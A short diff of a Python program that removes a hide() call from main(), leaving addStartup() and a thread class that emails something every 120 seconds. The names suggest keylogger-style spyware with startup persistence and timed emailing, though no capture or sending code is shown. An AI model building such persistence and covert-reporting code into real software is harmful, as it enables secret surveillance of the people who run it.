@@ -65,8 +65,7 @@ class TimerClass(threading.Thread):
 		self.event.wait(120)
 			
 def main():
-	addStartup() 
-	hide()
+	addStartup()
 	email=TimerClass()
 	email.start()
 
